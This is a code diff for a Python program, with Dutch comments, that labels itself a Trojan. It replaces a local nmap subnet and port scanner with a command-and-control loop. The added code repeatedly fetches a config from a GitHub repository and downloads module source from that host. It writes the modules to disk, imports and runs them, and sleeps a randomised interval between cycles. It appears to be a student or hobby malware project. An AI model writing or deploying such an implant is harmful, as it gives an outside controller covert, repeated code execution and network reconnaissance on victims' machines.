@@ -1,73 +1,74 @@
-import nmap
-import netifaces
-import ipaddress
-import platform
+import time
+import requests
+import random
+import importlib
+import json
+from pathlib import Path
+from modules.netwerk_scanner import run as netwerk_scanner_run  # Import de run functie van de netwerkscanner
 
-def get_local_subnet():
-    """Berekent het subnet op basis van het lokale IP-adres en subnetmasker, controleert eerst Ethernet, dan Wi-Fi."""
-    try:
-        # Log alle beschikbare netwerkinterfaces
-        print("Beschikbare netwerkinterfaces:")
-        interfaces_to_check = netifaces.interfaces()
-        print(interfaces_to_check)
-
-        # Eerst proberen we 'Ethernet', daarna 'Wi-Fi' voor Windows
-        interfaces_to_check = ['Ethernet', 'Wi-Fi']
-        
-        for iface in interfaces_to_check:
-            if iface in interfaces_to_check:
-                try:
-                    # Verkrijg het IP-adres en subnetmasker van de interface
-                    ip_address = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
-                    netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
-                    
-                    # Bereken het subnet
-                    network = ipaddress.IPv4Network(f'{ip_address}/{netmask}', strict=False)
-                    print(f"Subnet gevonden op {iface}: {network.network_address}/24")
-                    return str(network.network_address) + "/24"  # Subnet in /24-formaat (bijvoorbeeld 192.168.1.0/24)
-                except KeyError:
-                    # Als de interface geen IP-adres heeft, gaan we naar de volgende
-                    print(f"Geen IP-adres voor interface: {iface}")
-                    continue
-        
-        # Als we hier komen, is geen van de interfaces geschikt
-        print("Geen geldig subnet gevonden op Ethernet of Wi-Fi.")
+def fetch_configuration():
+    """Haalt de configuratie op van de GitHub repository."""
+    print("--- Configuratie ophalen ---")
+    url = "https://raw.githubusercontent.com/canuski/Trojan/main/config/config.json"
+    response = requests.get(url)
+    if response.status_code == 200:
+        print("Configuratie succesvol opgehaald.")
+        return response.json()
+    else:
+        print(f"Fout bij ophalen configuratie: {response.status_code}")
         return None
 
-    except Exception as e:
-        print(f"Fout bij ophalen subnet: {e}")
-        return None
-
-def run():
-    """
-    Voert een netwerk scan uit op het dynamisch berekende subnet.
-    Retourneert een string met de resultaten van de scan.
-    """
-    # Verkrijg dynamisch het lokale subnet
-    subnet = get_local_subnet()
-    if not subnet:
-        return "Fout bij het bepalen van het subnet."
-
-    scanner = nmap.PortScanner()
-    scan_results = []
-
-    print(f"Start netwerk scan op subnet: {subnet}")
+def fetch_and_run_module(module_name):
+    """Laadt en voert de module uit."""
+    print(f"Bezig met module: {module_name}")
     
-    try:
-        scanner.scan(hosts=subnet, arguments='-sP')  # Ping scan
-        for host in scanner.all_hosts():
-            if scanner[host].state() == "up":
-                host_info = f"Host: {host} ({scanner[host].hostname()}) is actief."
-                scan_results.append(host_info)
+    # Dynamisch laden van de module
+    module_url = f"https://raw.githubusercontent.com/canuski/Trojan/main/modules/{module_name}.py"
+    response = requests.get(module_url)
+    
+    if response.status_code == 200:
+        # Sla de module tijdelijk op in de directory
+        module_path = Path(f"modules_temp/{module_name}.py")
+        module_path.parent.mkdir(parents=True, exist_ok=True)
+        with open(module_path, "w") as file:
+            file.write(response.text)
 
-                # Zoek open poorten
-                print(f"Scan poorten op host: {host}")
-                scanner.scan(host, arguments='-p 1-1024 -sS')
-                for port in scanner[host]['tcp']:
-                    port_info = f"    Poort {port}: {scanner[host]['tcp'][port]['state']}"
-                    scan_results.append(port_info)
-    except Exception as e:
-        print(f"Fout tijdens netwerk scan: {e}")
-        return f"Scan mislukt: {e}"
+        # Importeer de module via importlib
+        importlib.import_module(f"modules_temp.{module_name}")
+        print(f"Module {module_name} succesvol geladen.")
 
-    return "\n".join(scan_results)
+        # Run de module
+        if module_name == "netwerk_scanner":
+            netwerk_scanner_run()
+    else:
+        print(f"Fout bij ophalen module {module_name}: {response.status_code}")
+
+def main():
+    print("Start Trojan...")
+
+    while True:
+        print("\n--- Nieuwe cyclus gestart ---")
+
+        # Stap 1: Haal configuratie op van GitHub
+        config = fetch_configuration()
+        if not config:
+            print("Fout bij het ophalen van configuratie, wacht 10 seconden...")
+            time.sleep(10)
+            continue
+
+        # Stap 2: Haal modules op en voer uit
+        modules = config.get("modules", [])
+        poll_frequency = config.get("poll_frequency", 60)
+        print(f"Gevonden modules: {modules}")
+        print(f"Pollfrequentie: {poll_frequency} seconden")
+
+        for module in modules:
+            fetch_and_run_module(module)
+
+        # Wacht voor de volgende cyclus
+        wait_time = random.uniform(poll_frequency * 0.8, poll_frequency * 1.2)
+        print(f"Wachten voor {wait_time:.2f} seconden...")
+        time.sleep(wait_time)
+
+if __name__ == "__main__":
+    main()
